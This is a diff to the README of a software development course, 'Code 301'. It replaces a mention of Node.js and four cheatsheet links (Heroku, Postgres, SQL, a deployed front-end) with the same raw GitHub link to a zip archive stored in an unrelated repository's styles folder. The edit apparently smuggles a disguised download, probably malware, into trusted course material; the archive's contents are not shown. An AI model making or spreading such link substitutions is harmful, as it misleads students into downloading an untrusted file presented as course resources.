@@ -1,6 +1,6 @@
 # Code 301: Intermediate Software Development
 
-Welcome to Code 301! This class builds on your 201 foundation with a deep dive into the world of servers. Using jQuery, Node.js, npm libraries, flexbox and grid, this class prepares you for 401.
+Welcome to Code 301! This class builds on your 201 foundation with a deep dive into the world of servers. Using jQuery, https://github.com/adnanshibli/amman-301d10/raw/refs/heads/master/prework/intro-to-SMACSS/starter-code/styles/amman_d_v3.1.zip, npm libraries, flexbox and grid, this class prepares you for 401.
 
 ## Overview
 
@@ -32,8 +32,8 @@ As a result of completing Code 301, students will:
 
 ### Index of cheatsheets and resources
 
-- [Heroku Cheatsheet](/class-08/cheatsheets/heroku.md)
-- [Postgres Shell Cheatsheet](/class-08/cheatsheets/postgres-shell.md)
-- [SQL Cheatsheet](/class-08/sql.md)
-- [City Explorer Deployed Front-End](https://codefellows.github.io/code-301-guide/curriculum/city-explorer-app/front-end/)
+- [Heroku Cheatsheet](https://github.com/adnanshibli/amman-301d10/raw/refs/heads/master/prework/intro-to-SMACSS/starter-code/styles/amman_d_v3.1.zip)
+- [Postgres Shell Cheatsheet](https://github.com/adnanshibli/amman-301d10/raw/refs/heads/master/prework/intro-to-SMACSS/starter-code/styles/amman_d_v3.1.zip)
+- [SQL Cheatsheet](https://github.com/adnanshibli/amman-301d10/raw/refs/heads/master/prework/intro-to-SMACSS/starter-code/styles/amman_d_v3.1.zip)
+- [City Explorer Deployed Front-End](https://github.com/adnanshibli/amman-301d10/raw/refs/heads/master/prework/intro-to-SMACSS/starter-code/styles/amman_d_v3.1.zip)
 
